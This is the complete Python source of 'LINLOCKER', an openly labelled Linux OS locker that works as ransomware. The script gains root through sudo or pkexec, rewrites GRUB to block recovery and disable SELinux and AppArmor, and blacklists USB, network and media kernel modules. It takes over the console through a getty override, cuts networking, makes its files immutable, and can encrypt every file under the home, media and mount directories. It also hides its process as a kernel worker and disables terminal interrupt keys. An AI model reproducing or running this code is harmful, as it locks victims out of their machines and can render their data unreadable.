# CREATOR 
# GitHub https://github.com/cppandpython
# NAME: Vladislav 
# SURNAME: Khudash  
# AGE: 17

# DATE: 16.02.2026
# APP: LINLOCKER
# TYPE: OS_LOCKER
# VERSION: LATEST
# PLATFORM: linux


#
#-
#--
#---
#----
#-----
#------
PASSWORD = '' # HERE IS LINLOCKER PASSWORD
ENCRYPTION = False # RESPONSIBLE FOR ENCRYPTION (ENABLED IF ENCRYPTION == True ELSE DISABLED)
MSG = '''
 ####      ####    ##   ##  ####      #####     ####   ###  ##  #######  ######
  ##        ##     ###  ##   ##      ##   ##   ##  ##   ##  ##   ##   #   ##  ##
  ##        ##     #### ##   ##      ##   ##  ##        ## ##    ## #     ##  ##
  ##        ##     ## ####   ##      ##   ##  ##        ####     ####     #####
  ##   #    ##     ##  ###   ##   #  ##   ##  ##        ## ##    ## #     ## ##
  ##  ##    ##     ##   ##   ##  ##  ##   ##   ##  ##   ##  ##   ##   #   ##  ##
 #######   ####    ##   ##  #######   #####     ####   ###  ##  #######  #### ##


Your system is completely locked
Enter password to unlock it
'''
#------
#-----
#----
#---
#--
#-
#




import os
from sys import argv, platform, executable
from subprocess import run as sp_run, DEVNULL
from shutil import move as move_file
from multiprocessing import Process
from mmap import mmap, ACCESS_WRITE
from hashlib import sha256
from random import randint
from ctypes import CDLL
from glob import glob


__file__ = os.path.abspath(argv[0])


if platform != 'linux':
    print(f'DO NOT SUPPORT ({platform})')
    os._exit(1)


def invalid_type(name, value, valid):
    if not isinstance(value, valid):
        raise TypeError(f'({name}) must be ({valid.__name__})')
    

invalid_type('PASSWORD', PASSWORD, str)


PID = str(os.getpid())

PATH = '/etc/linlocker'
FILE_LINLOCKER = os.path.join(PATH, 'linlocker')
FILE_FLAG = os.path.join(PATH, '._')

OS_RELEASE = '/etc/os-release'
NET = '/sys/class/net/'
GRUB = '/etc/default/grub'
MODPROBE = '/etc/modprobe.d/linlocker.conf'
LOGIND = '/etc/systemd/logind.conf'
GETTY = '/etc/systemd/system/getty@.service.d'
OVERRIDE_CONF = os.path.join(GETTY, 'override.conf')
USERS = [n for n in glob('/home/*') if os.path.isdir(n)]

ENCRYPTION_MAX_SIZE = 134_217_728
ENCRYPTION_MARK = b'\x1bB\xcd\x1f$v\xd0\xd3'
ENCRYPTION_NONCE = 8
ENCRYPTION_NONCE_NULL = bytes(ENCRYPTION_NONCE)
ENCRYPTION_KEY = sha256(PASSWORD.encode()).digest()
ENCRYPTION_PATH = []
ENCRYPTION_PATH.extend(USERS)
ENCRYPTION_PATH.extend([n for n in glob('/media/*') if os.path.isdir(n)])
ENCRYPTION_PATH.extend([n for n in glob('/mnt/*') if os.path.isdir(n)])

SUDO = '/usr/bin/pkexec' if (os.environ.get('DISPLAY', False) 
    or os.environ.get('WAYLAND_DISPLAY', False)) else '/usr/bin/sudo'

ID = 'linux'


def get_distribution():
    if not os.path.isfile(OS_RELEASE):
        return 'linux'
    
    with open(OS_RELEASE, 'r') as f:
        for n in f:
            n = n.strip().replace('"', '').lower()

            if n.startswith('id='):
                return n[3:]

    return 'linux'


def cmd(c, _new=False):
    try:
        return sp_run(c, input=False, stdout=DEVNULL, stderr=DEVNULL, start_new_session=_new).returncode
    except:
        return -1


def get_root():
    if '--root' in argv:
        return

    Process(target=lambda: cmd(
        [SUDO, executable, __file__, '--root'], 
        _new=True
    )).start()
    os._exit(0)


def update_grub():
    if ID in {'debian', 'ubuntu', 'linuxmint', 'pop', 'kali'}:
        cmd(['update-grub'])
    elif ID in {'arch', 'manjaro', 'endeavouros'}:
        cmd(['grub-mkconfig', '-o', '/boot/grub/grub.cfg'])
    elif ID in {'fedora', 'rhel', 'centos', 'rocky', 'almalinux'}:
        cmd(['grub2-mkconfig', '-o', '/boot/grub2/grub.cfg'])
    elif ID in {'opensuse', 'opensuse-leap', 'opensuse-tumbleweed'}:
        cmd(['grub2-mkconfig', '-o', '/boot/grub2/grub.cfg'])
    elif ID in {'void'}:
        if cmd(['update-grub']) == 0:
            return 
        
        cmd(['grub-mkconfig', '-o', '/boot/grub/grub.cfg'])
    else:
        for n in (
            ['update-grub'],
            ['grub-mkconfig', '-o', '/boot/grub/grub.cfg'],
            ['grub2-mkconfig', '-o', '/boot/grub2/grub.cfg'],
        ):
            if cmd(n) == 0:
                return 


def update_initramfs():
    if ID in {'debian', 'ubuntu', 'linuxmint', 'pop', 'kali'}:
        cmd(['update-initramfs', '-u', '-k', 'all']) 
    elif ID in {'arch', 'manjaro', 'endeavouros'}:
        cmd(['mkinitcpio', '-P'])
    elif ID in {'fedora', 'rhel', 'centos', 'rocky', 'almalinux'}:
        cmd(['dracut', '--force']) 
    elif ID in {'opensuse', 'opensuse-leap', 'opensuse-tumbleweed'}:
        cmd(['mkinitrd'])
    elif ID in {'void'}:
        cmd(['xbps-reconfigure', '-fa'])
    else:
        for n in (
            ['update-initramfs', '-u', '-k', 'all'],
            ['mkinitcpio', '-P'],
            ['dracut', '--force'],
            ['mkinitrd'],
        ):
            if cmd(n) == 0:
                return 
            

def disable_net():
    for n in os.listdir(NET):
        cmd(['ip', 'link', 'set', n, 'down'])
        cmd(['ifconfig', n, 'down'])
        cmd(['ip', 'addr', 'flush', n])


def enc(handle):
    with mmap(handle, 0, access=ACCESS_WRITE) as mf:
        len_mf = len(mf)
        counter = 0
        pos = ENCRYPTION_NONCE
        nonce = mf[:ENCRYPTION_NONCE]

        if nonce == ENCRYPTION_NONCE_NULL:
            nonce = os.urandom(ENCRYPTION_NONCE)
            mf[:ENCRYPTION_NONCE] = nonce

        while pos < len_mf:
            keystream = sha256((ENCRYPTION_KEY + nonce) + counter.to_bytes(8, 'little')).digest()

            counter += 1

            for n in keystream:
                if pos >= len_mf:
                    break

                mf[pos] ^= n
                pos += 1


def encrypt_file(path):
    try:
       with open(path, 'rb+') as f:
            if f.read(len(ENCRYPTION_MARK)) == ENCRYPTION_MARK:
                print(path, 'ok!')
                return
        
            f.seek(0, os.SEEK_SET)
            f.write(ENCRYPTION_MARK)
            enc(f.fileno())
    except:
        print(path, 'no!')
    else:
        print(path, 'ok!')


def encrypt(root_path):
    for root, _, files in os.walk(root_path):
        for n in files:
            try:
                fp = os.path.join(root, n)

                if os.path.getsize(fp) > ENCRYPTION_MAX_SIZE:
                    continue

                encrypt_file(fp)
            except:
                continue


def init():
    if not os.path.isdir(PATH):
        os.mkdir(PATH)

    if not os.path.isfile(FILE_LINLOCKER) and os.path.isfile(__file__):
        move_file(__file__, FILE_LINLOCKER)
    
    with open(GRUB, 'w') as f:
        f.write('''GRUB_DEFAULT=0
GRUB_TIMEOUT=0
GRUB_TIMEOUT_STYLE=hidden
GRUB_HIDDEN_TIMEOUT_QUIET=true
GRUB_DISABLE_OS_PROBER=true
GRUB_DISABLE_SUBMENU=y             
GRUB_DISABLE_RECOVERY=true
GRUB_DISABLE_INITRD_SIGNATURES=true
GRUB_RECORDFAIL_TIMEOUT=-1
GRUB_DISTRIBUTOR="linlocker"
GRUB_CMDLINE_LINUX_DEFAULT="nomodeset quiet nosplash vt.global_cursor_default=0 printk.devkmsg=off audit=0 loglevel=0 rd.udev.log_level=0 systemd.show_status=0 systemd.confirm_spawn=0 systemd.unit=multi-user.target systemd.crash_shell=0 systemd.crash_poweroff=1 quiet_systemd selinux=0 apparmor=0 security=null panic=0 rd.debug=0 rd.shell=0 rd.emergency=poweroff rd.break=poweroff"
GRUB_CMDLINE_LINUX=""
GRUB_TERMINAL=console
''')
    
    with open(MODPROBE, 'w') as f:
        f.write(''' install usbcore /bin/false
install uas /bin/false
install usb_storage /bin/false
install cdc_acm /bin/false
install mmc_block /bin/false
install ehci_hcd /bin/false
install xhci_hcd /bin/false
install ohci_hcd /bin/false
install fuse /bin/false       
install nbd /bin/false 
install ath10k_pci /bin/false
install btbcm /bin/false
install orinoco /bin/false
install prism2_usb /bin/false
install ath9k /bin/false
install b43 /bin/false
install e1000e /bin/false
install iwlwifi /bin/false
install r8169 /bin/false
install brcmsmac /bin/false
install rtl8188eu /bin/false
install rtl8192cu /bin/false
install bnep /bin/false
install bluetooth /bin/false
install btusb /bin/false
install rfcomm /bin/false
install cdc_ether /bin/false
install usbnet /bin/false
install tun /bin/false
install tap /bin/false
install veth /bin/false
install macvlan /bin/false
install dummy /bin/false
install bridge /bin/false
install snd_hda_intel /bin/false
install snd_hda_codec_hdmi /bin/false
install snd_soc_sst_broadwell /bin/false
install snd_sof_pci /bin/false
install snd_usb_audio /bin/false
install gspca_main /bin/false
install gspca_v4l /bin/false
install uvcvideo /bin/false
''')
        
    if not os.path.isdir(GETTY):
        os.mkdir(GETTY)
        
    with open(OVERRIDE_CONF, 'w') as f:
        f.write(f'''[Service]
ExecStart=
ExecStart=-/sbin/agetty --autologin root %I $TERM      
ExecStart=          
ExecStart="{executable}" "{FILE_LINLOCKER}" --root                  
Restart=always
RestartSec=1
''')
        
    with open(LOGIND, 'w') as f:
        f.write('''[Login]
NAutoVTs=1
ReserveVT=1
SessionsMax=1
KillUserProcesses=no
KillExcludeUsers=root
CtrlAltDelBurstAction=ignore                          
HandlePowerKey=ignore
HandleSuspendKey=ignore
HandleHibernateKey=ignore
HandleLidSwitch=ignore
''')
        
    for n in (
        ['systemctl', 'set-default', 'multi-user.target'],
        ['systemctl', 'restart', 'systemd-logind'],
        ['systemctl', 'enable', 'getty.target'],
        ['systemctl', 'disable', 'NetworkManager']
    ):
        cmd(n)

    update_grub()
    update_initramfs()

    disable_net()

    with open(FILE_FLAG, 'w') as f: ...

    for n in [
        PATH,                   
        FILE_LINLOCKER,       
        GRUB,                  
        MODPROBE,               
        LOGIND, 
        OVERRIDE_CONF       
    ]:
        cmd(['chattr', '+i', n])
        cmd(['chmod', '444' if os.path.isfile(n) else '555', n])

    cmd(['reboot'])


def shell():
    sp_run('clear', shell=True)

    if ENCRYPTION:
        for n in ENCRYPTION_PATH:
            try: 
                encrypt(n)
            except:
                print(n, 'no!')
                continue

    while True:
        try:
            welcome()
        except: 
            continue


def welcome():
    sp_run('clear', shell=True)
    print(MSG)

    try:
        password = input('PASSWORD: ').strip()
    except EOFError:
        return

    if password == PASSWORD:
        sp_run('clear', shell=True)
        print('Your system has been restored')
        destroy()
    elif password == 'exit':
        cmd(['poweroff'])
        os._exit(0)


def destroy():
    for n in [
        PATH,                   
        FILE_LINLOCKER,       
        GRUB,                  
        MODPROBE,               
        LOGIND, 
        OVERRIDE_CONF   
    ]:
        cmd(['chattr', '-i', n])  
        cmd(['chmod', '755', n])  

    cmd(['rm', '-rf', PATH])

    with open(GRUB, 'w') as f:
        f.write(f'''GRUB_DEFAULT=0
GRUB_TIMEOUT=0
GRUB_TIMEOUT_STYLE=hidden
GRUB_DISTRIBUTOR="{ID.capitalize()}"
GRUB_CMDLINE_LINUX_DEFAULT="quiet splash"
GRUB_CMDLINE_LINUX=""
''')
        
    if os.path.isfile(MODPROBE):
        os.remove(MODPROBE)

    with open(LOGIND, 'w') as f:
        f.write('[Login]')
    
    if os.path.isfile(OVERRIDE_CONF):
        os.remove(OVERRIDE_CONF)
    
    update_grub()
    update_initramfs()

    for n in (
        ['systemctl', 'set-default', 'graphical.target'],
        ['systemctl', 'restart', 'systemd-logind'],
        ['systemctl', 'enable', 'NetworkManager']
    ):
        cmd(n)

    if ENCRYPTION:
        for n in USERS:
            try:
                with open(os.path.join(n, 'requirement.txt'), 'w') as f:
                    f.write(MSG)
            except:
                continue

    cmd(['reboot'])
    os._exit(0)


def init_proc():
    try:
        libc = CDLL(None)
        libc.nice(-20)
        libc.prctl(4, 0, 0, 0, 0) 
        libc.prctl(0x59616d61, 0, 0, 0, 0)
        libc.prctl(15, f'[kworker/{randint(0, 12)}:{randint(0, 12)}]\0'.encode(), 0, 0, 0) 
    except: ...

    for n in (
        ['mount', '--bind', '/dev/null', f'/proc/{PID}/cmdline'],
        ['mount', '--bind', '/dev/null', f'/proc/{PID}/comm'],
        ['chrt', '-f', '99', '-p', PID]
    ):
        cmd(n)

    for (p, v) in [
        (f'/proc/{PID}/oom_score_adj', '-1000'),
        (f'/proc/{PID}/oom_adj', '-17'),
        (f'/proc/{PID}/ptrace_scope', '2')
    ]:
        try:
            with open(p, 'w') as f:
                f.write(v)
        except:
            continue


def main():
    global ID

    invalid_type('ENCRYPTION', ENCRYPTION, bool)
    invalid_type('MSG', MSG, str)

    if not PASSWORD:
        raise ValueError('(PASSWORD) is empty')

    get_root()

    init_proc()

    for n in (
        ['stty', 'intr', 'undef'],
        ['stty', 'quit', 'undef'],
        ['stty', 'susp', 'undef'],
        ['stty', 'ixon', 'off'],
        ['stty', 'ixoff', 'off'],
        ['stty', 'echoctl', 'off'],
        ['stty', 'eof', 'undef'],      
        ['stty', 'kill', 'undef'],     
        ['stty', 'werase', 'undef'],  
        ['stty', 'rprnt', 'undef'],    
        ['stty', 'lnext', 'undef'],    
        ['stty', 'discard', 'undef'],  
        ['stty', '-isig']             
    ):
        cmd(n)

    ID = get_distribution()

    (shell if os.path.isfile(FILE_FLAG) else init)()
    os._exit(0)


if __name__ == '__main__': main()